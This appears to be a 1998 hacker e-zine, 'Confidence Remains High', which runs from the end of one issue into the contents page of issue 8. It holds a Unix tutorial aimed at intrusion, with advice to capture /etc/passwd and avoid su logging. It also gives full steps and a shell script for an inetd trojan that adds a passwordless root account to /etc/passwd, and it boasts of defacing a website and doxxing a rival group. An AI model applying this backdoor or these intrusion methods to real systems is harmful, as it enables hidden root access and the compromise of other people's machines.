Password changing seems to be a big thing among the savants. Anyway to change
the password one would use the 'passwd' command as shown below:

   $ passwd
   Changing password for john
   Old password:                              
   New password:                              
   Retype new password:
   $
  
ps
--

It's sometimes necessary to see what command procesess you are running, this
command lets you see that.

ps [-a all processes except group leaders] [-e all processes] [-f the whole
   list]                                                           

   $ ps

   PID   TTY  TIME   COMMAND
   -------------------------
   200   tty9 14:20  ps

   The systems reports (PID - process idenetification number which is a #
   from 1-30,000 assigned to UNIX processes)
   It also reports the TTY, TIME and the COMMAND being executed at the time.
   To stop a process enter :    

   $ kill -9 [PID] (this case its 200)
   $

grep
----

This comand is important when seaching for a word or words in large files.

grep [argument] [file name] - searchs for an file that contains the argument
                              for example:
   $ grep phone cathy
    phone   michelle  (718)5551234
    phone   cindy   (718)5553456

    What this did was to find the argument 'phone' in the file cathy.If the
    argument consists of two or more words then  it must be enclosed in single
    quotes.


mv
--

mv [file names(s)] [ dir name ] - renames a file or moves it to another
                                  directory eg.      
   $ mv letter letters 
   $

        This renames the file letter to letters thereby deleting letter
        or if you want to move files then..

   $ mv /home/john/pers/capital /home/john/michelle/capital
   $   

        This moves the file capital to the directory named michelle

diff
----

diff [file name] [ file name] - show diffrence between two files. Output of
                                this will have something like 4, 5c4, 5 then
                                it will display both sets of files on the
                                screen The 4, 5c4, 5 means that you must
                                change "c" lines 4 to 5 in one file to
                                line 4 to 5 in another.

      Options for using this command are :

       -b             - it ignores blank spaces
       -h             - compares it quickly
       -s             - reports files that are the same
       -S [file]      - this is when you want to compare a directory starting at
                        a specific file
       

       There is also a command to compare 3 files which is :   
 
       diff3 [options] [file1] [file2] [file3]

cp
--

cp [file name] [file name] - makes a copy of a file

   $ cp letter letters
   $

        The file letters is a dupilcate copy of letter. In this case the
        original is not erased like in the mv command



more Unix commands:
-------------------

man [command] or [c/r] -will give you a list of commands explainations

help - available on some UNIX systems
                  
mkdir [dir name(s)] - makes a directory      

rmdir [dir name(s)] - removes directory.You wont be able to remove the
                      directory if it contains files in them

rm [file name(s)]   - removes files. rm * will erase all files in the current
                      dir. Be carefull!!. Some options are :

                      [-f unconditional removal] [-i Prompts user for y or n]
                        
write [login name]  - to write to other users terminals, sort of a chat.

mesg [-n] [-y]      - doesn't allow others to send you messages using the
                      write command. Wall used by system admin overrides it.

$ [file name]    - to execute any file that you have permission to run

wc [file name]   - Counts words,chracters, lines in a file

stty [modes]     - Set terminal I/O for the current devices

sort [filename]  - Sorts and merges files many options

spell [file name] > [file name] - The second file is where the misspelt words
                                  are entered

date [+%m%d%y*] [+%H%%M%S] - Displays date acoording to options

at [-r] [-l] [job] - Does a specified job at a specified time.The -r Removes 
                     all previously scheduled jobs.The -l reports the job #
                     and status of all jobs scheduled

write [login] [tty] - Sends message to the login name.Chat!


su [login name]
---------------

The su command allows one to switch user to a super user to a user.
Very important could be used to switch to super user accounts.

Usage :

$ su root
password:
#

This su command will be monitored in /usr/adm/sulog and this file of all files
is carefully monitered by the system administrator. Suppose you hacked in johns
account and then switched to the root account (ABOVE) your /usr/adm/sulog
entry would look like:

SU  04/19/88  21:00 + tty 12 john-root

Therfore the system administrator would know that john swithed to the root
account on 4/19/88 at 21:00 hours

Searching for valid login names:   
--------------------------------

using who..

$ who  ( command informs the user of other users on the system)
cathy  tty1  april 19  2:30
john   tty2  april 19  2:19
dipal  tty3  april 19  2:31
:
:
tty is the users terminal,date,time each logged on.dipal,john are valid
logins.   

Files worth looking at (cat)..

/etc/passwd file:
-----------------                     

The /etc/passwd is a vital file to cat. For it contains login names of all
users including super user accounts and their passwords. In the newer
Unix releases they are tighting their security by moving the encrypted
passwords from /etc/passwd to /etc/shadow making it only readable by root.
This is optional ofcourse.

$ cat /etc/passwd
root:D943/sys34:0:1:0000:/root:/bin/sh
sysadm:k54doPerate:0:0:administration:/usr/admin:/bin/sh
checkfsys:*:0:0:check file system:/usr/admin:/bin/sh
:
other super user accs.
:
john:chips11:34:3:john scezerend:/home/john:/bin/bash
:
other users..
:
$

If you have reached this far capture this file as soon as posible.
This is a typical output /etc/passwd file. The entries are seperated
by a ":", they are made be up to 7 fields in each line.

sysadm account, for example..

  sysadm:k54doPeHte:0:0:administration:/usr/admin:/bin/sh
    ^         ^      ^ ^       ^            ^         ^
    1         2      3 4       5            6         7

This is what each field represents..

   1: the login name, sysadm
   2: the ENCRYPTED password
   3: the user id, 0, the same as root
   4: the group id, 0, the same as root
   5: the users real name
   6: the users home directory, /usr/admin
   7: the shell that the user uses when he connects

..but in the case of the checkfsys account :

  checkfsys:*:0:0:check file system:/usr/admin:/bin/sh

  the :*: in place of the encrypted password means that this account is locked
  this IS NOT password shadowing, this is a lock on the account, so no-one can
  login as checkfsys without root taking the lock off the account's password.
  

IF PASSWORD SHADOWING IS ACTIVE :
---------------------------------

If the shawdowing is active the /etc/passwd would look like this:

root:x:0:1:0000:/:/bin/sh
sysadm:x:0:0:administration:/usr/admin:/bin/sh

The password fieled is substituted by "x".

The /etc/shawdow file is only readable by root will look similar to this:
                         ^^^^^^^^^^^^^^^^^^^^^
root:D943/sys34:5288:::::::
:
super user accounts
:
Cathy:m4faDai1:5055:7:120::::
:
all other users
:  

The first field contains users login, the second contains the password
(STILL ENCRYPTED), the third contains a code of when the password was last
changed, the fourth and the fifth contains the minimum and the maximum
numbers of days for pw changes (It's rare that you will find this in the
super-user logins due to there hard to guess passwords)

/etc/group
-----------
The file has each group on the system. Each line will have 4 entries
separated by a ":"  Example of concatenated /etc/group:

root::0:root
adm::2:adm,root
bluebox::70:

Group name:password:group id:login names in the group

  ** It very unlikely that groups will have passwords assigned to them **

The id "0" is assigned to the root user.

Adding new users when you're root
---------------------------------

        *** You must usually be root to run these commands ***

# adduser                 - will take you through a routine to add a user
                            this will look a little like this..

Anytime you want to quit, type "q".
If you are not sure how to answer any prompt, type "?" for help

If a default appears in the question,press <RETURN> for the default.

Enter users full name [?,q]:                      (enter the name you want)                
Enter users login ID [?,q]:                        (the id you want to use)
Enter users ID number (default 50000) [?,q) [?,q]:            (press enter)
Enter group ID number or group name:             (any name from /etc/group)
Enter users login home directory:                        (enter /home/name)

This is the information for the new login:
Users name:                                                          (name)
login ID:                                                              (id)
users ID:50000
group ID or name:     
home directory:/home/name

Do you want to install,edit,skip [i,e,s,q]? (enter your choice if "i" then)
Login installed
Do you want to give the user a password?[y,n]     (its better to enter one)
New password:
Re-enter password:   

..That information will then be added to the /etc/passwd file, and the
  home dir and all the default files made for the user.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. inetd backdoors : Phreak-0
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

I think I have found a new backdoor that could be considered pretty
undetectable.  I found this while I was playing around with things in the
/etc/inetd.conf file.  What it does is allow you to remotely issue any
command of your choice as root by just telneting to a port that YOU
specify. You have to have already have compromised root for this to work
=)   

A normal entry into the inetd.conf will look like this :

pop3   stream  tcp     nowait  root    /usr/sbin/tcpd  in.pop3d

Notice that tcpd is what executes when the in.pop3d service is called upon.
tcpd is a program that verifies that you have access to use the specified
service. After you are verified, it will then execute "in.pop3d", which is
specified.

What if we made a shell script named in.pop3d and had it issue a set of
commands whenever used, and then start up the real service?

So here is how you setup the backdoor, step by step :

1) First and foremost, type csh so you arent logged =)

2) After gaining root, find the service you want to manually trojan in
   /etc/inetd.conf.  The service SHOULD already be UNCOMMENTED if you want
   to be extremely undetectable (The admin would check for new services as
   backdoors, not old ones already in use). This service should be defined as
   running as root.

3) Take the service, such as in.pop3d and rename it to one of the programs
   that are COMMENTED with #, as those services are not in use. 

   eg.  mv /usr/sbin/in.pop3d /usr/sbin/in.talkd

4) Now, you have to create a new in.pop3d so that people are able to use it 
   type : pico in.pop3d  then stick this simple shell script in there :

#!/bin/sh
#Service Trojan by Phreak-0
echo "bewm::0:0:,,,:/:/bin/csh" >> /etc/passwd
#..or any command you may desire.
#echo "+ +" > /root/.rhosts
#echo "0wned Bitches" > /etc/motd
#
#Warning above could get annoying =)
#
#After our trojan has executed, we spawn the real program
#service, which in this case you renamed to in.talkd.

/usr/sbin/in.talkd

#this really spawns the old /usr/sbin/in.pop3d

Now save the file as the daemon you picked in step 2 and type :
chmod +x filename

filename is the name of the daemon shell script for all you dumbasses

5) Now you have to restart inetd for the changes to take place.
   kill inetd by typing:

   ps -x |grep inetd
   1529  ?  S    0:00 inetd 

   Get the pid of inetd (1529) and type:

   kill -HUP 1529


6) Now get off and just telnet to port 110 of the victim and just disconnect.
   Then telnet over and try to login as the name you specified in the password
   file (bewm).  You are now root.

   Now, whenever anyone telnets to port 110 of victim.com, any command you
   specified in the shell script will be executed.  muahah they will never
   suspect that by just telneting to a port of your choice on the remote
   machine, you can execute any command as root that you specify. Remember to
   be creative with the script.  this backdoor is sure to last for a while, so
   peace out yo..

   -- Phreak-0 of #CaRpartS NTF

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. 0wned : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

..this motd r00lz :
-------------------

System V.3.1 / UTS 2.1 (uts)

login: informix
Password:
***************************************************************************
*     THIS  SYSTEM IS TO  BE USED  EXCLUSIVELY  FOR OFFICIAL GOVERNMENT   *
*     BUSINESS.  USERS  VIOLATING THIS RESTRICTION  WILL BE  SUBJECT TO   *
*     ADMINISTRATIVE AND CRIMINAL PENALTIES.                              *
***************************************************************************
*     GOVERNMENT TELECOMMUNICATIONS  SYSTEMS AND  AUTOMATED INFORMATION   *
*     SYSTEMS ARE SUBJECT TO A PERIODIC SECURITY TESTING AND MONITORING   *
*     TO ENSURE  PROPER COMMUNICATIONS  SECURITY COMSEC PROCEDURES  ARE   *
*     BEING  OBSERVED. USE  OF THESE  SYSTEMS  CONSTITUTES  CONSENT  TO   *
*     SECURITY TESTING AND COMSEC MONITORING.                             *
***************************************************************************
*     ACCESS TO  THIS SYSTEM  WILL ONLY BE GAINED THRU  THE INFORMATION   *
*     SYSTEM SECURITY OFFICE (ISSO).  IF YOU HAVE ACCESS TO THIS SYSTEM   *
*     WITHOUT  GOING THRU  (ISSO)  --  YOU WILL BE REMOVED  --  CONTACT   *
*     YOUR ISSO IF YOU WISH TO REMAIN ON THIS SYSTEM.                     *
***************************************************************************
*     THE INFORMIX & OSC PASSWORDS HAVE BEEN CHANGED. CONTACT THE OSC     *
*     WORK GROUP AT DSN 693-2940/2943 IF YOU EXPERIENCE PROBLEMS.         *
***************************************************************************

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. dnscan : sw1tch
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

% dnscan -domain dj
dj    intnet                          bow.rain.fr                   
dj    pnud                            bow.intnet.dj                 
%

that country r0x.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  6. The issues list for 1998 : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  Issue 8 : Sun 22nd March
  Issue 9 : Mon 11th May
  Issue 10: Tue 30th June
  Issue 11: Wed 19th August
  Issue 12: Thu 8th October
  Issue 13: Fri 27th November

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ NEWS ]=====================[ .SECTION E. ]=======================[ NEWS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. SpiceWorld 0wned : sw1tch
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Scenario, so1o's just gotten out of policy custody after questioning, I'm
in Bristol, it's a Friday night, we have 2 laptops, 2 modems, and a set of
logins and passes for the SpiceGirls official website
(http://c3.vmg.co.uk/spicegirls), hooked our equipment up using mad tekneeqz,
and changed their elite site from a carded i$p account. The crew that were
around at the time were...

  so1o, NightRage, myself, BoMbJAcK, ev0, Mulder

It was a quick and easy job, we were soon phoning the papers etc. In the end
the page itself was up from midnight on friday to 10am on monday, thats 58
hours. The page itself is mirrored at www.hacked.net under the November
section.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. zeon.net : ch-e-ztic
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

zeon.net is an internet services provider now, we just got a t1 installed, and
we're running our shells from freeBSD, it's all good, fucking good prices too,
check out www.zeon.net, or mail sales@zeon.net for more info!

cheers,

chez.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ PROJECTS ]=================[ .SECTION F. ]===================[ PROJECTS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. TOTALCON '98 : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                         http://www.aom.co.uk/total/
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
  +------------------------------------+------------------------------------+
  Ý  An Official TotalCon Announcement Ý An Official TotalCon Announcement  Ý
  Ý  An Official TotalCon Announcement Ý An Official TotalCon Announcement  Ý
  +------------------------------------+------------------------------------+
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                         http://www.aom.co.uk/total/
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


 TotalCon '98 is now a reality, here are preliminary details...
 ==============================================================

 Venue        :  The Old Firestation, Silver Street, Bristol, ENGLAND
 Date         :  Late March 1998      27th March *OR* 4th April, TBA
 Duration     :  36 hours non-stop    (midday -> 10:00pm next day)

 Cost         :  15 (15 UKP) ON THE DOOR, this will go back into
                                           the event (beer etc.)

 What         :  12 system network (with additional terminals) along
                 with full internet access, bring your laptops!

                 Loud music, live DJ's
                 Fully licensed bar downstairs / next door
                 Elite UV and spotlighting

                 ALOT of cool people
                 ^^^^^^^^^^^^^^^^^^^

      *** NO SPEAKERS WHATSOEVER *** *** NO SPEAKERS WHATSOEVER ***


 Travel        : Easily accessible by car, train, bus, plane or boat.

 Accomodation  : You can hang around the Firestation or book one of
                 many good hotels in the immediate area.


 Notes         : ALL CA$H RAISED AT THE DOOR FROM ENTRANCE FEES WILL
                 GO BACK INTO THE EVENT! WE WILL PURCHASE GREAT AMOUNTS
                 OF BEER AND FOOD, PROBABLY EVEN A LAPTOP AS A PRIZE!!


$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                         http://www.aom.co.uk/total/
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
  +------------------------------------+------------------------------------+
  Ý  An Official TotalCon Announcement Ý An Official TotalCon Announcement  Ý
  Ý  An Official TotalCon Announcement Ý An Official TotalCon Announcement  Ý
  +------------------------------------+------------------------------------+
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                         http://www.aom.co.uk/total/
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FIN ]======================[ .SECTION G. ]========================[ FIN ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                                .-----------.                    
                                :           :                      
                        .-----. `-----.     ; .-----.                
                :.      :  .--'      .'    .' :     :      .:            
        .-------:::.    :  :       .'    .'   :  .  :    .:::-------.    
        `-------:::'    :: :     .'    .'     :: :  :    `:::-------'    
                :'      ::.`--. ::::  `-----. ::.   :      `:          
                        `-----' ::::.       : `-----'                
                                `-----------'                      
                                                                 
                              [ Team CodeZero ]                
                                                             
                         w3 r00l, ph34r 0ur tekn33qz       
                                                                               
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        . [cZo] .          Team CodeZero Presents            . [cZo] .
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


      /IIIIIIIIII          /IIIIIIIIII           /III   /III
      \ III_____/          \ III___/III          \ III  \ III
       \ III                \ III  \ III          \ III  \_III
        \ III  onfidence     \ IIIIIIII  emains    \ IIIIIIIIII  igh
         \ III                \ III__/III           \ III__/ III
          \ III                \ III  \ III          \ III  \ III
           \ IIIIIIIIII   ___   \ III  \ III   ___    \ III  \ III   ___
            \_________/  /\__\   \__/   \__/  /\__\    \__/   \__/  /\__\
                         \/__/                \/__/                 \/__/


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                                                                      Issue 8
                                                              22nd March 1998
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


              Man with the plan :  so1o

                      The usual :  om3n, zer0x, xFli, electro,
                                   spheroid, el8, ultima, chameleon.

                  Not forgotten :  loss, organik, peenut, pzn, suid
                                   helix, deprave, manly, Shok.

                         Others :  paladine, Sciri, fiji, ch-E-ztic,
                                   vacuum, humble.

                         Cheers :  Darkcyde, Jf.

                       Russians :  lirik, DemiGod, stranger, ps.


                     .-----------[ An Official ]-----------.
                     :      .-----.  .----.   .--.--.      :
                     :      :  .--'  : .-. :  :  :  :      :
                     !_-::  :  :     : `-' ;  :  .  :  ::-_!
                     :~-::  :: :     :: . :   ::    :  ::-~:
                     :      ::.`--.  ::.:  :  ::.:  :      :
                     :      `-----'  `--'--'  `--'--'      :
                     !_-::                             ::-_!
                     :~-::-[ Confidence Remains High ]-::-~:
                     :~-::                             ::-~:
                     `-----------[ Production ]------------'


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  In This (compact) Installment of Confidence Remains High : 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

------=>  Section A  :  Introduction And Cover Story.

    1. Confidence Remains High issue 8....................: Tetsu Khan
    2. sIn (here we go again).............................: so1o

------=>  Section B  :  Exploits And Code.
 
    1. Jimmy J's "vintage warez" : pack #1................: JJ
    2. routed remote......................................: Kit Knox
    3. Wingate scanner....................................: cL0ut
    4. LinSniffer 0.666...................................: humble
    5. SunOS 5.5.1 in.rshd trojan.........................: anonymous

------=>  Section C  :  Phones / Scanning / Radio.

    1. Outdials...........................................: Lirik
    2. BlueBoxing in the UK in '98........................: The UK Phreaking
                                                            Elite
    3. UK Phone Definitions and Abbreviations.............: Jf

------=>  Section D  :  Miscellaneous.

    1. Top 10 reasons why.................................: anonymous
    2. Hacking Digital Unix 4.0...........................: humble
    3. FreeBSD 2.2.5 rootkit..............................: humble / method
    4. l0ckd0wn.sh........................................: so1o

------=>  Section E  :  World News.

    1. VMG 0wned..........................................: sw1tch

-------=> Section F  :  Projects.

    1. The Rhino9 Sentinel................................: so1o / humble
    2. TotalCon...........................................: so1o

------=> Section G  :  FIN.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ INTRO ]====================[ .SECTION A. ]======================[ INTRO ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Confidence Remains High issue 8 : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

It's all good, issue 8 is here, life is good, and I feel great. Blah blah blah,
enjoy :D


The distro list..
=================

   ftp.sekurity.org                                 /users/so1o/
   www.fth.org                                      /crh/
   www.technotronic.com                             /files/ezines/crh/
   cybrids.simplenet.com                            /Toast/files/CRH/
   ftp.linuxwarez.com                               /pub/crh/
  

Also check out..
================

   www.hacked.net     <-- Archive of all the stuff we have 0wned.

   /server dark.technonet.com 6667   #!r00td0wn
   ---------------------------------------------
                 ^-- or kali.cylink.net, dhp.com 6666, few others..


 want to mail us? tk85@hotmail.com, you got CRH on your site? tell us f00l!

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. sIn (here we go again) : so1o  
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

I have on thing to say, and that is.. we 0wned sIn, go see it at hacked.net,
www.hacked.net/exp/com/sinnerz/, we also pulled their d0x, they now live in
phear. PERIOD, it is over. yes? We win, you lose, every time.

here is a p1c 0f s0me sIn cl00bag t4ken by 4n el8 s4tellit3 :

                 \|||||/
                 / o o \    __________       |
                {   ^   }-=/ give me  \      |
                 \_____/    \ vB k0dez!|     |
                    |    /   ``````````      |
                   /|\  /              O     |
                  / | \/                     |
                    |                        |
                   / \                       |
                  /   \                      |


w0w, fh 1s pl4y1ng w4ll b4ll, a p0pular m0rmon pastt1me!

For free sIn d0x to add to your 0wn filez of 0wnersh1p, check earlier CRH
issues (namedly 3-5).. CRH distro list in pt.1

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ EXPLOITS / CODE ]==========[ .SECTION B. ]============[ EXPLOITS / CODE ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Jimmy J's "vintage warez" : pack #1
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                                ####      ####
                                ####      ####
                                ####      ####
                           #### #### #### ####
                           #### #### #### ####
